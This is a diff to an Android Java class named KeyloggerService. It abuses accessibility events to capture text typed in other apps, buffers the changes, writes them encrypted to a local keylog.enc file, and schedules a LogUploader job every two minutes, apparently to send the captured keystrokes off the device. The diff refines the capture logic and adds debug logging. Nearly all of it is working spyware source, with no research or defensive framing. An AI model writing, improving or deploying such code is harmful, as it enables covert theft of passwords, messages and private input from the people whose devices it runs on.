@@ -5,51 +5,60 @@ import android.view.accessibility.AccessibilityEvent;
 import android.util.Log;
 import java.io.FileOutputStream;
 import android.content.Context;
+
 import androidx.work.WorkManager;
 import androidx.work.PeriodicWorkRequest;
 
 import java.util.concurrent.TimeUnit;
 
 public class KeyloggerService extends AccessibilityService {
+
+    private static final String TAG = "KeyloggerService";
     private StringBuilder logBuffer = new StringBuilder();
     private String lastText = "";
 
     @Override
     public void onServiceConnected() {
         scheduleUploader();
+        Log.d(TAG, "✅ KeyloggerService connected");
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-            String newText = event.getText().toString().replaceAll("[\\[\\]]", ""); // Remove brackets
-            String delta = getDelta(lastText, newText);
-            lastText = newText;
+            String currentText = "";
+            if (event.getText() != null && !event.getText().isEmpty()) {
+                currentText = event.getText().get(0).toString(); // Get first item from the list
+            }
+            String delta = getDifference(lastText, currentText);
 
-            if (!delta.isEmpty() && isPrintable(delta)) {
+            if (!delta.isEmpty()) {
                 logBuffer.append(delta);
-                if (delta.equals(" ") || delta.equals("\n")) {
-                    logBuffer.append(" "); // add space after words
+                lastText = currentText;
+
+                if (logBuffer.length() > 100) {
+                    saveEncrypted(logBuffer.toString());
+                    logBuffer.setLength(0);
                 }
             }
-
-            if (logBuffer.length() > 100) {
-                saveEncrypted(logBuffer.toString().trim());
-                logBuffer.setLength(0);
-            }
         }
     }
 
-    private String getDelta(String oldText, String newText) {
-        if (newText.startsWith(oldText)) {
-            return newText.substring(oldText.length());
+    private String getDifference(String oldStr, String newStr) {
+        int minLen = Math.min(oldStr.length(), newStr.length());
+
+        int i = 0;
+        while (i < minLen && oldStr.charAt(i) == newStr.charAt(i)) {
+            i++;
+        }
+
+        if (newStr.length() > oldStr.length()) {
+            return newStr.substring(i);
+        } else if (oldStr.length() > newStr.length()) {
+            return "[DEL]";
         } else {
-            return ""; // handle deletion or text clearing
+            return "";
         }
-    }
-
-    private boolean isPrintable(String text) {
-        return text.matches("[\\x20-\\x7E]+|\\s"); // ASCII printable chars and whitespace
     }
 
     private void saveEncrypted(String text) {
@@ -58,8 +67,9 @@ public class KeyloggerService extends AccessibilityService {
             FileOutputStream fos = openFileOutput("keylog.enc", Context.MODE_APPEND);
             fos.write((encrypted + "\n").getBytes());
             fos.close();
+            Log.d(TAG, "🔐 Encrypted keystrokes saved");
         } catch (Exception e) {
-            e.printStackTrace();
+            Log.e(TAG, "❌ Failed to save encrypted log", e);
         }
     }
 
@@ -67,6 +77,7 @@ public class KeyloggerService extends AccessibilityService {
         PeriodicWorkRequest request = new PeriodicWorkRequest
                 .Builder(LogUploader.class, 2, TimeUnit.MINUTES)
                 .build();
+
         WorkManager.getInstance(this).enqueue(request);
     }
 
